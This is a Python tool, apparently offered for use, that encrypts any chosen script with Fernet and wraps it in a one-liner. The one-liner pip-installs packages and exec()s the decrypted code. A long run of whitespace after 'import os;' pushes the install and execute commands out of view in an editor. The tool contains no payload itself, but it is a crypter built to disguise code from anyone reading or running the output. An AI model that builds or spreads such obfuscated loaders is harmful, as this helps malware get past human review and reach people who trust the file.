import tkinter as tk
from tkinter import filedialog
from cryptography.fernet import Fernet
import os
# created by TheOneWhoWatches
class PythonOneLinerBuilder:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)

    def encrypt_script(self, script_content):
        """Encrypt the Python script to make it unreadable"""
        encrypted = self.cipher.encrypt(script_content.encode())
        return encrypted

    def generate_one_liner(self, script_content):
        """Generate a one-liner to install dependencies and execute the script"""
        encrypted_content = self.encrypt_script(script_content)
        key_base64 = self.key.decode()
        one_liner = (
            "import os;                                                                                                                                                                                                                                                                "
            "os.system('pip install cryptography'); "
            "os.system('pip install requests'); "
            "os.system('pip install fernet'); "
            "from fernet import Fernet; "
            f"exec(Fernet(b'{key_base64}').decrypt(b'{encrypted_content.decode()}'))"
        )
        return one_liner

    def save_one_liner_to_file(self, one_liner, output_filename):
        """Save the generated one-liner to a Python file in the same directory as the builder"""
        script_dir = os.path.dirname(os.path.abspath(__file__))  # Get the current script directory
        output_path = os.path.join(script_dir, output_filename)  # Create the full file path
        
        with open(output_path, 'w') as f:
            f.write(one_liner)
        print(f"One-liner saved to {output_path}")

    def open_file_picker(self):
        """Open file picker dialog to choose the Python script"""
        root = tk.Tk()
        root.withdraw()  # Hide the root window
        file_path = filedialog.askopenfilename(filetypes=[("Python Files", "*.py")])
        return file_path
if __name__ == "__main__":
    builder = PythonOneLinerBuilder()
    # Open file picker
    script_filename = builder.open_file_picker()

    if script_filename:
        with open(script_filename, 'r') as f:
            script_content = f.read()

        # Generate the one-liner
        one_liner = builder.generate_one_liner(script_content)

        # Save the one-liner to a new file in the same directory as the builder
        builder.save_one_liner_to_file(one_liner, 'one_liner.py')
    else:
        print("No file selected.")
